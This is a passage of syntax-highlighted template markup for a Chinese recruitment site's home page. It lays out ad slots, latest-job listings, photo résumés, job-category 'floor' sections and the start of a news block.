        <span class="nt">&lt;/div&gt;</span>
        
      <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-名企招聘结束 --&gt;</span>
  <span class="c">&lt;!-- 1198*58 广告  --&gt;</span>
  {#qishi_ad set="显示数目:3,调用名称:QS_indexcenter,列表名:ad,文字长度:12"#}
  {#if $ad#}
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-area"</span><span class="nt">&gt;</span>
  {#foreach from=$ad item=list#}
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-row clearfix lazyload"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-item ad-full f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  {#/foreach#}
  <span class="nt">&lt;/div&gt;</span>
  {#/if#}
  <span class="c">&lt;!-- 列表-最新职位 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>最新职位<span class="nt">&lt;span&gt;</span>Latest Job<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-right underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>更多&gt;&gt;<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"newest-list clearfix"</span><span class="nt">&gt;</span>
      {#qishi_companyjobs_list set="列表名:jobs,显示数目:40,职位名长度:12,显示职位:1,企业名长度:12,排序:rtime&gt;desc"#}
      {#foreach from=$jobs item=list#}
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"newest-items f-left"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;i</span> <span class="na">class=</span><span class="s">"nc-icon"</span><span class="nt">&gt;&lt;/i&gt;</span>
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"newest-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
        {#foreach from=$list.jobs item=li#}
        <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"newest-job underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
        {#/foreach#}
      <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-最新职位结束 --&gt;</span>
  <span class="c">&lt;!-- 1198*58 广告  --&gt;</span>
  {#qishi_ad set="显示数目:3,调用名称:QS_indexfootbanner,列表名:ad,文字长度:12"#}
  {#if $ad#}
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-area"</span><span class="nt">&gt;</span>
  {#foreach from=$ad item=list#}
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-row clearfix lazyload"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"ad-item ad-full f-left"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  {#/foreach#}
  <span class="nt">&lt;/div&gt;</span>
  {#/if#}
  <span class="c">&lt;!-- 列表-照片简历 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>照片简历<span class="nt">&lt;span&gt;</span>Photo Resume<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_resumelist</span><span class="err">,</span><span class="na">photo:1</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-right underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>更多&gt;&gt;<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"photo-list clearfix"</span><span class="nt">&gt;</span>
      {#qishi_resume_list set="列表名:resume,显示数目:7,照片:1,意向职位长度:14,填补字符:...,排序:rtime&gt;desc"#}
      {#foreach from=$resume item=list#}
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"photo-items f-left"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"avater-box"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"avater"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.resume_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$list.photosrc#})<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.resume_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span> <span class="na">class=</span><span class="s">"underline"</span><span class="nt">&gt;</span>{#$list.fullname#}<span class="nt">&lt;/a&gt;&lt;/p&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"photo-info"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;p&gt;</span>{#$list.education_cn#},{#$list.experience_cn#}<span class="nt">&lt;/p&gt;</span>
            <span class="nt">&lt;p&gt;</span>{#$list.intention_jobs#}<span class="nt">&lt;/p&gt;</span>
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      {#/foreach#}
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-照片简历结束 --&gt;</span>
  <span class="c">&lt;!-- 列表-职位导航 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>职位导航<span class="nt">&lt;span&gt;</span>Jobs Navigation<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"job-build"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- 楼层1  --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-item"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-title"</span><span class="nt">&gt;&lt;em&gt;</span>1F<span class="nt">&lt;/em&gt;&lt;span&gt;</span>{#"QS_jobs,76"|qishi_categoryname#} · {#"QS_jobs,77"|qishi_categoryname#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-box clearfix"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 分类 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-sort f-left"</span><span class="nt">&gt;</span>
            {#qishi_get_classify set="列表名:subcate,类型:QS_jobs_floor,显示数目:20,id:76_77"#}
            {#foreach from=$subcate item=list#}
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">,</span><span class="na">jobcategory:</span><span class="err">"|</span><span class="na">cat:74</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">parentid</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">id</span><span class="err">|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-sort-item f-left"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.categoryname#}<span class="nt">&lt;/a&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 职位 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-jobs f-left"</span><span class="nt">&gt;</span>
            {#qishi_companyjobs_list set="列表名:comjobs,显示数目:10,显示职位:3,职位分类:76_77"#}
            {#foreach from=$comjobs item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-job-row"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"f-job-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
              {#foreach from=$list.jobs item=li#}
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"f-job-name underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/div&gt;</span>
            {#/foreach#}

          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 广告 楼层广告1 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad-box f-left lazyload"</span><span class="nt">&gt;</span>
            {#qishi_ad set="显示数目:4,调用名称:QS_floor_img1,列表名:ad,文字长度:12"#}
            {#if $ad#}
            {#foreach from=$ad item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            {#/foreach#}
            {#/if#}
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="c">&lt;!-- 楼层 2 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-item"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-title"</span><span class="nt">&gt;&lt;em&gt;</span>2F<span class="nt">&lt;/em&gt;&lt;span&gt;</span>{#"QS_jobs,3"|qishi_categoryname#} · {#"QS_jobs,5"|qishi_categoryname#} · {#"QS_jobs,6"|qishi_categoryname#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-box clearfix"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 分类 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-sort f-left"</span><span class="nt">&gt;</span>
            {#qishi_get_classify set="列表名:subcate,类型:QS_jobs_floor,显示数目:20,id:3_5_6"#}
            {#foreach from=$subcate item=list#}
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">,</span><span class="na">jobcategory:</span><span class="err">"|</span><span class="na">cat:1</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">parentid</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">id</span><span class="err">|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-sort-item f-left"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.categoryname#}<span class="nt">&lt;/a&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 职位 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-jobs f-left"</span><span class="nt">&gt;</span>
            {#qishi_companyjobs_list set="列表名:comjobs,显示数目:10,显示职位:3,职位分类:3_5_6"#}
            {#foreach from=$comjobs item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-job-row"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"f-job-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
              {#foreach from=$list.jobs item=li#}
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"f-job-name underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/div&gt;</span>
            {#/foreach#}

          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 广告 楼层广告1 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad-box f-left lazyload"</span><span class="nt">&gt;</span>
            {#qishi_ad set="显示数目:4,调用名称:QS_floor_img2,列表名:ad,文字长度:12"#}
            {#if $ad#}
            {#foreach from=$ad item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            {#/foreach#}
            {#/if#}
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="c">&lt;!-- 楼层 3 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-item"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-title"</span><span class="nt">&gt;&lt;em&gt;</span>3F<span class="nt">&lt;/em&gt;&lt;span&gt;</span>{#"QS_jobs,117"|qishi_categoryname#} · {#"QS_jobs,120"|qishi_categoryname#} · {#"QS_jobs,121"|qishi_categoryname#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-box clearfix"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 分类 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-sort f-left"</span><span class="nt">&gt;</span>
            {#qishi_get_classify set="列表名:subcate,类型:QS_jobs_floor,显示数目:20,id:117_120_121"#}
            {#foreach from=$subcate item=list#}
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">,</span><span class="na">jobcategory:</span><span class="err">"|</span><span class="na">cat:116</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">parentid</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">id</span><span class="err">|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-sort-item f-left"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.categoryname#}<span class="nt">&lt;/a&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 职位 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-jobs f-left"</span><span class="nt">&gt;</span>
            {#qishi_companyjobs_list set="列表名:comjobs,显示数目:10,显示职位:3,职位分类:117_120_121"#}
            {#foreach from=$comjobs item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-job-row"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"f-job-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
              {#foreach from=$list.jobs item=li#}
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"f-job-name underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/div&gt;</span>
            {#/foreach#}

          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 广告 楼层广告1 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad-box f-left lazyload"</span><span class="nt">&gt;</span>
            {#qishi_ad set="显示数目:4,调用名称:QS_floor_img3,列表名:ad,文字长度:12"#}
            {#if $ad#}
            {#foreach from=$ad item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            {#/foreach#}
            {#/if#}
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="c">&lt;!-- 楼层 4 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-item"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-title"</span><span class="nt">&gt;&lt;em&gt;</span>4F<span class="nt">&lt;/em&gt;&lt;span&gt;</span>{#"QS_jobs,97"|qishi_categoryname#} · {#"QS_jobs,98"|qishi_categoryname#} · {#"QS_jobs,99"|qishi_categoryname#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-box clearfix"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 分类 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-sort f-left"</span><span class="nt">&gt;</span>
            {#qishi_get_classify set="列表名:subcate,类型:QS_jobs_floor,显示数目:20,id:97_98_99"#}
            {#foreach from=$subcate item=list#}
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">,</span><span class="na">jobcategory:</span><span class="err">"|</span><span class="na">cat:96</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">parentid</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">id</span><span class="err">|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-sort-item f-left"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.categoryname#}<span class="nt">&lt;/a&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 职位 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-jobs f-left"</span><span class="nt">&gt;</span>
            {#qishi_companyjobs_list set="列表名:comjobs,显示数目:10,显示职位:3,职位分类:97_98_99"#}
            {#foreach from=$comjobs item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-job-row"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"f-job-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
              {#foreach from=$list.jobs item=li#}
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"f-job-name underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/div&gt;</span>
            {#/foreach#}

          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 广告 楼层广告1 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad-box f-left lazyload"</span><span class="nt">&gt;</span>
            {#qishi_ad set="显示数目:4,调用名称:QS_floor_img4,列表名:ad,文字长度:12"#}
            {#if $ad#}
            {#foreach from=$ad item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            {#/foreach#}
            {#/if#}
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
      <span class="c">&lt;!-- 楼层 5 --&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-item"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-title"</span><span class="nt">&gt;&lt;em&gt;</span>5F<span class="nt">&lt;/em&gt;&lt;span&gt;</span>{#"QS_jobs,50"|qishi_categoryname#} · {#"QS_jobs,51"|qishi_categoryname#} · {#"QS_jobs,52"|qishi_categoryname#}<span class="nt">&lt;/span&gt;&lt;/div&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-box clearfix"</span><span class="nt">&gt;</span>
          <span class="c">&lt;!-- 分类 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-sort f-left"</span><span class="nt">&gt;</span>
            {#qishi_get_classify set="列表名:subcate,类型:QS_jobs_floor,显示数目:20,id:50_51_52"#}
            {#foreach from=$subcate item=list#}
            <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_jobslist</span><span class="err">,</span><span class="na">jobcategory:</span><span class="err">"|</span><span class="na">cat:49</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">parentid</span><span class="err">|</span><span class="na">cat:</span><span class="err">"."|</span><span class="na">cat:</span><span class="err">$</span><span class="na">list</span><span class="err">.</span><span class="na">id</span><span class="err">|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-sort-item f-left"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.categoryname#}<span class="nt">&lt;/a&gt;</span>
            {#/foreach#}
          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 职位 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-jobs f-left"</span><span class="nt">&gt;</span>
            {#qishi_companyjobs_list set="列表名:comjobs,显示数目:10,显示职位:3,职位分类:50_51_52"#}
            {#foreach from=$comjobs item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"f-job-row"</span><span class="nt">&gt;</span>
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.company_url#}"</span> <span class="na">class=</span><span class="s">"f-job-com underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$list.companyname#}<span class="nt">&lt;/a&gt;</span>
              {#foreach from=$list.jobs item=li#}
              <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#$li.jobs_url#}"</span> <span class="na">class=</span><span class="s">"f-job-name underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>{#$li.jobs_name#}<span class="nt">&lt;/a&gt;</span>
              {#/foreach#}
            <span class="nt">&lt;/div&gt;</span>
            {#/foreach#}

          <span class="nt">&lt;/div&gt;</span>
          <span class="c">&lt;!-- 广告 楼层广告1 --&gt;</span>
          <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad-box f-left lazyload"</span><span class="nt">&gt;</span>
            {#qishi_ad set="显示数目:4,调用名称:QS_floor_img5,列表名:ad,文字长度:12"#}
            {#if $ad#}
            {#foreach from=$ad item=list#}
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"floor-ad"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"{#$list.img_url#}"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>![]({#$QISHI.site_template#}images/index/84.gif)<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
            {#/foreach#}
            {#/if#}
          <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="c">&lt;!-- 列表-职位导航结束 --&gt;</span>
  <span class="c">&lt;!-- 列表-职场资讯 --&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"index-data-wrap"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blue-line"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"data-title-box clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;h4</span> <span class="na">class=</span><span class="s">"f-left"</span><span class="nt">&gt;</span>职场资讯<span class="nt">&lt;span&gt;</span>Workplace Information<span class="nt">&lt;/span&gt;&lt;/h4&gt;</span>
      <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"{#"</span><span class="na">QS_news</span><span class="err">"|</span><span class="na">qishi_url#</span><span class="err">}"</span> <span class="na">class=</span><span class="s">"f-right underline"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>更多&gt;&gt;<span class="nt">&lt;/a&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"job-news-block clearfix"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"jn-left f-left"</span><span class="nt">&gt;</span>
        {#qishi_news_category set="列表名:newscategory,资讯大类:1,显示数目:4"#}
        {#section loop=$newscategory name=nclist#}
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"jn-box f-left"</span><span class="nt">&gt;</span>
